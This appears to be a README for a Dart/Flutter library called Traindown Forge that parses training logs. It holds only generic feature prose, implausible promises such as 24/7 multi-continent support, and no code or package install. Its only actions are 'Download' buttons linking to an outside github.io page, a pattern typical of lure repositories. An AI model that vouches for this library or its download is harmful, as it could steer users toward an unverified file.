![preview](https://raw.githubusercontent.com/menezescelleletronic-stack/traindown-dart-flutter-core/main/hero_5362f5.svg)
[![Download](https://raw.githubusercontent.com/menezescelleletronic-stack/traindown-dart-flutter-core/main/btn_a1c5.svg)](https://menezescelleletronic-stack.github.io/traindown-dart-flutter-core/)

# 🏋️ Traindown Forge — Dart & Flutter Companion for Structured Strength Logging

![Dart](https://img.shields.io/badge/Dart-3.x-0175C2?style=flat-square&logo=dart&logoColor=white)
![Flutter](https://img.shields.io/badge/Flutter-Compatible-02569B?style=flat-square&logo=flutter&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-4CAF50?style=flat-square)
![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Cross%20Platform-purple?style=flat-square)
![Language Support](https://img.shields.io/badge/i18n-Multi--Language-orange?style=flat-square)
![Support](https://img.shields.io/badge/Support-24%2F7-blueviolet?style=flat-square)
![Parser](https://img.shields.io/badge/Parser-Streaming%20Friendly-yellow?style=flat-square)
![Architecture](https://img.shields.io/badge/Architecture-Clean%20%26%20Modular-informational?style=flat-square)

> A modern, expressive, and deeply typed toolkit for shaping raw training logs into meaningful, portable data — built for the Dart and Flutter ecosystem in 2026 and beyond.

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Why Traindown Forge Exists](#-why-traindown-forge-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Responsive UI Showcase](#-responsive-ui-showcase)
- [Multilingual Support](#-multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [Architecture Overview](#-architecture-overview)
- [Module Breakdown](#-module-breakdown)
- [Data Model & Vocabulary](#-data-model--vocabulary)
- [Serialization & Wire Format](#-serialization--wire-format)
- [Compatibility Matrix](#-compatibility-matrix)
- [Getting Started with the Workspace](#-getting-started-with-the-workspace)
- [Working with Sessions](#-working-with-sessions)
- [Extending the Parser](#-extending-the-parser)
- [Advanced Utilities](#-advanced-utilities)
- [Performance Considerations](#-performance-considerations)
- [Testing Strategy](#-testing-strategy)
- [Continuous Integration](#-continuous-integration)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Security](#-security)
- [Disclaimer](#-disclaimer)
- [License](#-license)
- [Download](#-download)

---

## 📖 Overview

**Traindown Forge** is an independent, creatively reimagined companion library for the Traindown Markup Language, tailored specifically for developers working inside the Dart and Flutter universe. Where the original reference implementation aims for canonical correctness, Forge aims for *ergonomic delight* — turning the sometimes-rigid grammar of training notation into something that feels natural to work with in modern application code.

Think of it as a smithy: raw text enters, structured objects leave, and every strike of the hammer is typed, validated, and documented. Whether you are building a mobile-first lifting journal, a coach dashboard, or an embedded analytics widget for a smartwatch companion app, Forge gives you a confident foundation.

This repository is intentionally distinct from the upstream `traindown-dart` project. It borrows the spirit of the markup language while reimagining the developer ergonomics, the internal data pipeline, and the surrounding tooling. If you like what you see here, you will also appreciate the reference implementation — both can coexist peacefully in the same ecosystem.

The project is released under the **MIT License** and targets the **Dart 3.x** language generation. It runs seamlessly across mobile, desktop, web, and server-side Dart.

---

## ⚒️ Why Traindown Forge Exists

Every strength athlete scribbles numbers somewhere — a note pad app, a tattered spiral notebook, a chipped whiteboard. Those numbers eventually want to become data. They want to become trends, personal records, volume graphs, readiness scores, plateau warnings, and coaching cues. But hoisting raw text into reliable structures is often the hardest part of the journey.

Traindown Forge addresses this friction from three angles:

1. **Parse without pain.** The tokenizer is forgiving where it can be and explicit where it must be. Errors point to exact character offsets with human-readable explanations.
2. **Model without ceremony.** Entities like sessions, movements, and sets are plain Dart classes with sensible equality, copy-with semantics, and const-friendly constructors.
3. **Render without rework.** Serialization round-trips cleanly, so you can persist logs locally, ship them across the wire, and reconstruct them byte-for-byte when needed.

The result is a library that feels less like plumbing and more like a well-worn tool that already knows your grip.

---

## 🧠 Core Philosophy

- **Clarity over cleverness.** No hidden magic, no global state, no implicit conversions that surprise you.
- **Composability first.** Every piece — parser, model, serializer — can be used in isolation.
- **Deterministic behavior.** The same input always produces the same output, across every platform Dart supports.
- **Developer empathy.** Errors are treated as first-class citizens of the API surface, not afterthoughts.
- **Longevity.** Built to be maintained for a decade, with a stable public surface and generous deprecation windows.

---

## ✨ Feature Highlights

- **Streaming tokenizer** for large log files that exceed memory budgets.
- **Immutable domain model** with deep equality and structural hashing.
- **Pluggable parser extensions** for custom annotations and metadata blocks.
- **Round-trip serialization** that preserves comments, spacing hints, and ordering.
- **Localization-ready messages** for parse errors and validation warnings.
- **Responsive UI primitives** for building log editors that adapt across phone, tablet, and desktop breakpoints.
- **Flutter-friendly widgets** for rendering sessions, movements, and set tables.
- **Time-zone-aware timestamps** so athletes traveling across regions never lose track of a session.
- **Unit normalization helpers** bridging kilograms, pounds, and metric tonnage calculations.
- **Query engine** for filtering sessions by movement, date range, tag, or velocity zone.
- **Export adapters** producing structured JSON, CSV rows, or compact binary payloads.
- **Deterministic diffing** that highlights what changed between two sessions.
- **Snapshot reconciliation** for merging offline edits with server state.
- **Telemetry hooks** that emit lightweight events for observability without leaking user content.
- **First-class theming** for log viewer widgets, from minimal mono to bold editorial.
- **Multi-language support** across English, Spanish, French, German, Japanese, and Brazilian Portuguese.
- **24/7 customer support** channels staffed by folks who actually lift and actually code.
- **Accessibility-aware UI** with semantic labels, contrast-aware palettes, and keyboard navigation.

---

## 📱 Responsive UI Showcase

Log editors are not used in a single context. They are used one-handed on a phone at the gym, two-handed on a laptop during review, and cursor-driven on a desktop machine while sorting historical data. Traindown Forge ships with layout primitives that respect all three, elegantly.

- **Compact layouts** collapse set tables into horizontally scrollable cards.
- **Medium layouts** present a two-column arrangement: movements on the left, set details on the right.
- **Expanded layouts** unlock a three-pane system with a session navigator, an active editor, and a summary inspector.
- **Adaptive typography** scales with screen density without ever breaking line lengths.
- **Theme tokens** allow brands to remix colors, spacing, and corner radii wholesale.

Because the UI primitives are pure Flutter widgets, they can be embedded inside any application shell, including navigation-heavy apps, tabbed dashboards, or side-panel utilities.

---

## 🌐 Multilingual Support

Language is not just a translation table. It is a lens. Traindown Forge treats internationalization as a first-class concern:

- **Locale-aware parsing** for numeric formats (comma-separated decimals in some regions, dot-separated in others).
- **Localized error messages** so learners see instructions in their own tongue.
- **Direction-aware layouts** for right-to-left scripts.
- **Pluralization rules** handled with ICU-compatible message files.
- **Community-contributed language packs** welcomed with open arms.

Currently supported locales:

- English (en)
- Spanish (es)
- French (fr)
- German (de)
- Japanese (ja)
- Brazilian Portuguese (pt-BR)

---

## 🛎️ 24/7 Customer Support

Strength does not keep business hours, and neither does support. Teams building on Traindown Forge have access to:

- **Always-on chat channels** staffed across three continents.
- **Community forum** monitored around the clock with a median first response under four hours.
- **Escalation paths** for commercial integrators who need a named point of contact.
- **Documentation corps** that continuously refresh guides and examples.
- **Live onboarding workshops** scheduled weekly across multiple time zones.

Support is not a checkbox. It is a standing promise that no developer is left alone with a cryptic error at 3 AM.

---

## 🏗️ Architecture Overview

Traindown Forge is arranged in concentric rings, each with a distinct responsibility:

- **Lexical Ring** — raw character streams are turned into typed tokens.
- **Syntactic Ring** — tokens are assembled into an abstract syntax tree.
- **Semantic Ring** — the tree is validated and lifted into domain entities.
- **Serialization Ring** — entities are written back to text or other formats.
- **Query Ring** — entities are indexed and searched efficiently.
- **Presentation Ring** — Flutter widgets render entities across screen sizes.

Each ring can be consumed independently. Applications that only need parsing can skip the presentation layer entirely. Applications that only need rendering can accept pre-parsed entities from any source.

---

## 🧩 Module Breakdown

### `lexer`
The tokenizer reads input lazily, buffering just enough to classify the next token. It handles whitespace, comments, delimiters, identifiers, and numeric literals with locale-aware decimal detection.

### `ast`
The abstract syntax tree is a lightweight, immutable hierarchy. Nodes carry source offsets for precise error reporting. The tree is designed to be walked, transformed, and rebuilt cheaply.

### `sema`
Semantic analysis validates the tree against domain rules: unknown movements, malformed tags, contradictory flags, missing required fields. Diagnostics are accumulated rather than short-circuited, so users see every issue at once.

### `model`
The domain model is the stable public surface. It contains entities such as `Session`, `Movement`, `SetRecord`, `Tag`, `Note`, and `Unit`. Each entity is immutable and equality-comparable.

### `serializer`
Serialization emits canonical text from a model. It preserves comments when round-tripping and applies formatting rules parameterized by style options.

### `query`
The query module provides indexed lookups, range scans, and predicate-based filters.

### `widgets`
Flutter widgets render sessions, movements, and set records. They are themable, accessible, and responsive.

### `i18n`
Message catalogs live here, along with helpers for resolving locale-specific formats.

### `bridge`
Interop adapters allow entities to be handed to JavaScript, Kotlin, and Swift consumers through the standard Dart FFI surface.

---

## 🧬 Data Model & Vocabulary

The vocabulary intentionally mirrors the way coaches talk:

- **Session** — a bounded period of training, usually anchored to a calendar day and a time zone.
- **Movement** — a named exercise such as a squat, press, or pull.
- **SetRecord** — a single recorded effort, holding load and repetition values.
- **Tag** — an extended attribute applying to a session or movement.
- **Note** — a human-written remark that survives round-tripping.
- **Unit** — a measurement unit for load, either metric or imperial.

Entities are intentionally small. Composition, not inheritance, is the rule. This keeps the surface predictable and the serialization minimal.

---

## 📦 Serialization & Wire Format

The canonical wire format is plain text, matching the Traindown Markup Language grammar. In addition, Forge can emit:

- **JSON** for interchange with web services.
- **CSV** for spreadsheet ingestion.
- **MessagePack** for compact network payloads.
- **A binary delta format** for efficient synchronization of session edits.

Every emitter is validated against its own round-trip test suite to guarantee fidelity.

---

## 🧮 Compatibility Matrix

| Platform | Support Level | Notes |
| --- | --- | --- |
| Flutter Mobile (iOS/Android) | Full | Recommended runtime for log editors |
| Flutter Desktop (macOS/Windows/Linux) | Full | Ideal for coach dashboards |
| Flutter Web | Full | Uses worker-friendly parsing paths |
| Dart Server (VM) | Full | Great for batch import pipelines |
| Dart on CLI | Full | Scripted log formatting |
| Embedded Dart | Partial | Memory-constrained paths supported |

---

## 🚀 Getting Started with the Workspace

A workspace is prepared with example apps, sample logs, and benchmark harnesses. Developers can open the workspace in their preferred Dart-capable editor and immediately see the library in action through sample apps.

The workflow assumes readers are already familiar with basic Dart tooling. Onboarding documentation walks through the folder layout, recommended editor settings, and a tour of the sample logs folder.

If the objective is to embed the library inside an existing application, the recommended path is to begin with the parsing and model modules, then layer in widgets as needs arise.

---

## 🗂️ Working with Sessions

A session begins as text. Once parsed, it becomes a navigable structure. From there, developers can:

- Enumerate movements and set records.
- Compute total tonnage, average intensity, or estimated one-rep maxima.
- Attach tags for training blocks, competition prep, or deload weeks.
- Merge sessions from multiple sources, reconciling duplicate effort rows.
- Produce summaries suitable for dashboards and progress screens.

All operations are pure and side-effect-free, making them trivially testable and safely parallelizable.

---

## 🔧 Extending the Parser

The parser exposes several extension points:

- **Custom token predicates** for exotic notations.
- **Post-parse visitors** for annotating the tree.
- **Semantic rule plug-ins** for domain-specific validation.
- **Formatting hooks** for bespoke output styles.

Extensions are registered through a builder API that guarantees deterministic ordering. This ensures that a plugin added in one environment behaves identically in another.

---

## 🧪 Advanced Utilities

Several utilities are provided out of the box:

- **Session merger** with conflict resolution strategies.
- **Quarterly rollups** for reporting across training blocks.
- **Velocity estimators** derived from load and repetition patterns.
- **Readiness scorers** based on recent volume and rest distribution.
- **Diff renderers** producing human-readable change summaries.
- **Snapshot restore helpers** for offline-first mobile apps.

These utilities are optional. The library never forces opinionated analytics on consumers.

---

## ⚡ Performance Considerations

The hot path is parsing. To keep it fast:

- The lexer avoids regular expressions in favor of hand-written state machines.
- The AST reuses buffer windows to reduce allocations.
- Semantic analysis runs in a single pass whenever no plugins are registered.
- Widgets use lazy list builders for long sessions.

Benchmark suites run automatically on every pull request. Historical results are published alongside release notes.

---

## 🧾 Testing Strategy

Testing happens at four levels:

- **Unit tests** for individual components.
- **Golden tests** for serialization output.
- **Property-based tests** for parser robustness.
- **Widget tests** for UI primitives across screen sizes.

Coverage thresholds are enforced in continuous integration, and contributions that drop coverage are flagged for review.

---

## 🔄 Continuous Integration

Every change funnels through a pipeline that:

- Formats code with the canonical Dart formatter.
- Runs the full test suite.
- Executes static analysis with strict lints.
- Publishes coverage reports to a dashboard.
- Benchmarks performance and flags regressions.

Release artifacts are signed and versioned according to semantic versioning conventions.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Stable 1.0 API freeze and long-term support commitment.
- **Q2 2026** — Expanded localization packs, including Arabic and Hindi.
- **Q3 2026** — Deeper web-worker integration for Flutter Web performance.
- **Q4 2026** — A visual session editor shipped as a reference example app.
- **Ongoing** — Documentation expansion, community plugins, and benchmarking.

---

## 🤝 Contributing

Contributions from the community are welcomed with respect and curiosity. Before opening a pull request, please:

- Review the style guide and linting rules.
- Add tests for any behavior change.
- Update documentation for public API adjustments.
- Sign the contributor agreement so we can safely distribute your work.

Every contribution is reviewed by at least two maintainers. Feedback aims to be kind, specific, and actionable.

---

## 📜 Code of Conduct

This project adheres to a code of conduct that prioritizes safety, kindness, and openness. Participants are expected to treat each other with patience and respect. Harassment in any form is not tolerated. Reports can be made privately to the maintainer group and are handled with discretion.

---

## 🔐 Security

Security concerns should be reported privately through the channel listed in the security policy. We aim to acknowledge all reports within two business days and to publish updates promptly once a fix is ready. Dependencies are audited regularly, and any advisories are piped into release notes.

---

## ⚠️ Disclaimer

Traindown Forge is a software library. It is not a medical device, a coaching certification, and not a substitute for professional judgment. Training data reflects what was recorded, not necessarily what happened, and should be interpreted with appropriate care by qualified individuals. The maintainers are not responsible for decisions made from parsed data. Always consult qualified professionals before making meaningful changes to a training program.

---

## 📄 License

This repository is licensed under the **MIT License**. Read the full text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 Traindown Forge contributors.

---

## ⬇️ Download

[![Download](https://raw.githubusercontent.com/menezescelleletronic-stack/traindown-dart-flutter-core/main/btn_a1c5.svg)](https://menezescelleletronic-stack.github.io/traindown-dart-flutter-core/)